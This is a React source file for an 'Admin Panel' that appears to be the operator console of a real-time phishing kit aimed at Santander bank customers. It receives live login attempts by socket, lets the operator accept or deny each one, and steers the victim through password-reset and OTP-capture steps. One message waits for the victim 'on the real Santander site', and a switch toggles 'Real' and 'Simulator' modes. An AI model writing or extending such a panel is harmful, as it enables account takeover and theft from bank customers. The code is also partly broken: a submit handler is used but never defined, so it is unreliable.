import React, { useEffect, useState } from 'react';
import socketIOClient from 'socket.io-client';

interface LoginAttempt {
    username: string;
    ip: string;
    timestamp: string;
    status: string;
}

const socket = socketIOClient('http://localhost:5000'); // Adjust the URL as needed

const notificationSound = '/notification.mp3'; // Place your sound file in public/

const AdminPanel: React.FC = () => {
    const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
    const [modalOpen, setModalOpen] = useState(false);
    const [modalStep, setModalStep] = useState<'init'|'choose'|'reset'|'reset-loading'|'reset-code'|'otp-wait'|'otp-code'|'confirm-reset'|null>(null);
    const [currentAttempt, setCurrentAttempt] = useState<LoginAttempt|null>(null);
    const [resetCode, setResetCode] = useState('');
    const [otpCode, setOtpCode] = useState('');
    const [loading, setLoading] = useState(false);
    const [mode, setMode] = useState<'real'>('real');

    // Fetch mode from backend on mount
    useEffect(() => {
        fetch('/get_mode')
            .then(res => res.json())
            .then(data => {
                if (data.mode === 'real' || data.mode === 'simulator') {
                    setMode(data.mode);
                }
            });
    }, []);

    const handleModeChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const newMode = e.target.checked ? 'real' : 'simulator';
        setMode(newMode as 'real' | 'simulator');
        await fetch('/set_mode', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mode: newMode })
        });
    };

    useEffect(() => {
        socket.on('login_attempt', (data: LoginAttempt) => {
            // Play notification sound
            const audio = new Audio(notificationSound);
            audio.play();
            setCurrentAttempt(data);
            setModalStep('init');
            setModalOpen(true);
        });
        return () => {
            socket.off('login_attempt');
        };
    }, []);

    const handleApprove = async () => {
        if (!currentAttempt) return;
        await fetch('/log_attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentAttempt.username, status: 'approved' }),
        });
        setModalStep('choose');
    };

    const handleDeny = async () => {
        if (!currentAttempt) return;
        await fetch('/log_attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentAttempt.username, status: 'denied' }),
        });
        setModalOpen(false);
        setModalStep(null);
        setCurrentAttempt(null);
    };

    const handleRequestReset = async () => {
        if (!currentAttempt) return;
        setModalStep('reset');
    };

    const handleResetWithEmail = async () => {
        setModalStep('reset-loading');
        setLoading(true);
        // Simulate waiting for admin to approve after user resets on real Santander
        setTimeout(() => {
            setLoading(false);
            setModalStep('confirm-reset');
        }, 4000); // Simulate 4s wait
    };

    const handleConfirmReset = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        const form = e.currentTarget;
        const newPassword = form.newPassword.value;
        console.log('New Password:', newPassword);
        // Here you would send the new password to the backend or store it as needed
        setModalOpen(false);
        setModalStep(null);
        setCurrentAttempt(null);
    };

    const handleRequestOTP = async () => {
        if (!currentAttempt) return;
        setModalStep('otp-wait');
        // Simulate waiting for admin to confirm OTP sent
        setTimeout(() => {
            setModalStep('otp-code');
        }, 3000);
    };

    const handleSubmitOTP = async (e: React.FormEvent) => {
        e.preventDefault();
        // Here you would send the OTP code to backend
        setModalOpen(false);
        setModalStep(null);
        setCurrentAttempt(null);
        setOtpCode('');
    };

    // For demo: add login attempts to table
    useEffect(() => {
        if (currentAttempt && !loginAttempts.some(a => a.timestamp === currentAttempt.timestamp)) {
            setLoginAttempts(prev => [currentAttempt, ...prev]);
        }
    }, [currentAttempt]);

    return (
        <div>
            <h1>Admin Panel</h1>
            <div style={{marginBottom: 16}}>
                <label style={{fontWeight:'bold',marginRight:8}}>Mode:</label>
                <label style={{marginRight:8}}>
                    <input
                        type="checkbox"
                        checked={mode === 'real'}
                        onChange={handleModeChange}
                    />
                    {mode === 'real' ? 'Real' : 'Simulator'}
                </label>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>IP Address</th>
                        <th>Timestamp</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody>
                    {loginAttempts.map((attempt, index) => (
                        <tr key={index}>
                            <td>{attempt.username}</td>
                            <td>{attempt.ip}</td>
                            <td>{attempt.timestamp}</td>
                            <td>{attempt.status}</td>
                        </tr>
                    ))}
                </tbody>
            </table>

            {/* Modal Dialog */}
            {modalOpen && currentAttempt && (
                <div style={{position:'fixed',top:0,left:0,right:0,bottom:0,background:'rgba(0,0,0,0.5)',display:'flex',alignItems:'center',justifyContent:'center',zIndex:1000}}>
                    <div style={{background:'#fff',padding:32,borderRadius:8,minWidth:320}}>
                        {modalStep === 'init' && (
                            <>
                                <h2>Login Attempt</h2>
                                <p>User: <b>{currentAttempt.username}</b></p>
                                <p>IP: {currentAttempt.ip}</p>
                                <p>Time: {currentAttempt.timestamp}</p>
                                <div style={{display:'flex',gap:8,marginTop:16}}>
                                    <button onClick={handleApprove}>Accept</button>
                                    <button onClick={handleDeny}>Deny</button>
                                </div>
                            </>
                        )}
                        {modalStep === 'choose' && (
                            <>
                                <h2>Next Action</h2>
                                <p>Choose how to proceed:</p>
                                <div style={{display:'flex',gap:8,marginTop:16}}>
                                    <button onClick={handleRequestReset}>Reset Password</button>
                                    <button onClick={handleRequestOTP}>OTP Verification</button>
                                </div>
                            </>
                        )}
                        {modalStep === 'reset' && (
                            <>
                                <h2>Password Reset</h2>
                                <p>This user does not have the reset option. Triggering OTP instead.</p>
                                <button onClick={handleResetWithEmail}>Reset with Email</button>
                            </>
                        )}
                        {modalStep === 'reset-loading' && (
                            <>
                                <h2>Waiting for Password Reset</h2>
                                <p>Please wait while the user resets their password on the real Santander site...</p>
                                <div className="spinner" style={{margin:'16px auto',width:32,height:32,border:'4px solid #ccc',borderTop:'4px solid #333',borderRadius:'50%',animation:'spin 1s linear infinite'}}></div>
                            </>
                        )}
                        {modalStep === 'reset-code' && (
                            <>
                                <h2>Enter Reset Code</h2>
                                <form onSubmit={handleSubmitResetCode}>
                                    <input type="text" value={resetCode} onChange={e=>setResetCode(e.target.value)} placeholder="Enter code" required />
                                    <button type="submit">Submit</button>
                                </form>
                            </>
                        )}
                        {modalStep === 'otp-wait' && (
                            <>
                                <h2>OTP Verification</h2>
                                <p>Waiting for you to confirm OTP has been sent...</p>
                            </>
                        )}
                        {modalStep === 'confirm-reset' && (
                            <>
                                <h2>Confirm Password Reset</h2>
                                <form onSubmit={handleConfirmReset}>
                                    <input type="password" name="newPassword" placeholder="Enter new password" required />
                                    <button type="submit">Confirm Reset</button>
                                </form>
                            </>
                        )}
                        {modalStep === 'otp-code' && (
                            <>
                                <h2>Enter OTP Code</h2>
                                <form onSubmit={handleSubmitOTP}>
                                    <input type="text" value={otpCode} onChange={e=>setOtpCode(e.target.value)} placeholder="Enter OTP" required />
                                    <button type="submit">Submit</button>
                                </form>
                            </>
                        )}
                    </div>
                </div>
            )}
        </div>
    );
};

export default AdminPanel;
